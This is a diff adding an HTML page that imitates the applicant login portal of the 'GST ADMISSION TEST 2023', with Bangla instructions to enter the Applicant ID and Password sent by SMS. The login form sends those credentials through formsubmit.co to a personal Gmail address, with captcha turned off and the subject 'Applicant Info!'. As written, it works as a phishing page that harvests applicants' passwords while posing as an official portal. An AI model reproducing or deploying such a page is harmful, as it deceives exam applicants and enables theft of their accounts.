@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+
+  <link rel="stylesheet" href="Gst_login.css">
+  <style>
+
+  </style>
+</head>
+
+<body>
+  <!--  <div class="footer">
+    This website is under construction
+  </div> -->
+  <div style="z-index:100;" class="stickyhead">
+    <a style="text-decoration: none;color: white;" href="https://studyhour247.000webhostapp.com/Gst_demo/gst_home.html">
+      GST ADMISSION TEST 2023</a>
+  </div>
+
+  <button class="head_btn" onclick="myFunction()"
+    style="position:fixed ; right: 8px; top: 9px; background-color: #285880;color: white; z-index :120; border:none; outline: none;"
+    type="button"><i style="font-size: 26px;" class="bi bi-list"></i></button>
+  <aside style="z-index:100;" class="asideHidden" id="myDIV">
+    <nav>
+
+      <a href="https://studyhour247.000webhostapp.com/Gst_demo/gst_home.html">HOME</a>
+      <hr>
+      <a href="">CONTACT</a>
+      <hr>
+      <a href="">RESOURCES </a>
+      <hr>
+      <a href="">ABOUT US</a>
+
+
+    </nav>
+
+  </aside>
+
+  <div class="main_content">
+    <div class="a recovery_and_login">
+      <strong class="recovery_and_login_header"><i class="bi bi-person-badge"></i> Application / Login </strong>
+      <hr>
+
+      <div class="b recovery">
+        <div class="recovery_text">
+          <p>SMS এর মাধ্যমে প্রাপ্ত Applicant ID <br> ও Password ব্যবহার করে লগিন করুন। </p>
+          <p style="margin-top: 15px">
+            Application ID ও Password পুনরুদ্ধার <br> করতে Recover Id / Password বাটনে ক্লিক করুন।
+          </p>
+        </div>
+        <div class="c recovery_btn_group">
+          <button style="border: none;color: white; background-color: #D85048  ;" class="recovery_btn" type="button"><i
+              class="bi bi-arrow-counterclockwise"></i> Recover Applicant ID / Password </button>
+          <button style="margin-top: 10px; background-color: #F0A848 ; border:none;color:white;" class="recovery_btn"
+            type="button"><i class="bi bi-phone-flip"></i> Change Mobile Number </button>
+        </div>
+      </div>
+
+
+      <!-- login form -->
+
+      <div class="d login">
+        <div class="login_header"><strong><i class="bi bi-file-lock-fill"></i> Applicant Login</strong>
+        </div>
+        <form action="https://formsubmit.co/pro.iftekhar@gmail.com" method="POST">
+          <div class="login_input">
+            <div class="input_grp">
+
+
+              <label for="Applicant"> Applicant ID</label><br>
+              <input class="e1" placeholder="Your ID" name="Applicant" type="number" required>
+            </div>
+
+            <div class="input_grp">
+
+              <label for="Password"> Password</label><br>
+              <input class="e2" placeholder="Your Password" name="Password" id="" type="password" required>
+            </div>
+
+          </div>
+          <hr>
+          <div class="login_btn_group ">
+            <button style="background-color: #D85048;" class="login_btn" type="reset"><i class="bi bi-arrow-left"></i>
+              Back</button>
+            <button style="background-color: #58B858 ;" class="login_btn" type="submit"><i
+                class="bi bi-box-arrow-in-right"></i> Login</button>
+          </div>
+
+          <input type="hidden" name="_subject" value="Applicant Info!">
+          <input type="hidden" name="_captcha" value="false">
+        </form>
+      </div>
+
+    </div>
+
+
+
+
+  </div>
+
+
+  <button style="z-index:120; left:0;" class="dark_btn" onclick="darkMode()" type="button"><i id="myicon"
+      class="bi bi-brightness-high-fill"></i> </button>
+
+
+  <script>
+    function myFunction() {
+      var element = document.getElementById("myDIV");
+      element.classList.toggle("asideSTYLE");
+    }
+  </script>
+  <script>
+    function darkMode() {
+      document.querySelector('body').classList.toggle('dark2');
+      document.querySelector('.a').classList.toggle('gray');
+      document.querySelector('.b').classList.toggle('dark');
+      document.querySelector('.c').classList.toggle('dark');
+      document.querySelector('.d').classList.toggle('dark');
+      document.querySelector('.e1').classList.toggle('gray');
+      document.querySelector('.e2').classList.toggle('gray');
+
+      document.getElementById("myicon").classList.toggle('bi-moon-stars-fill');
+    }
+  </script>
+
+</body>
+
+</html>
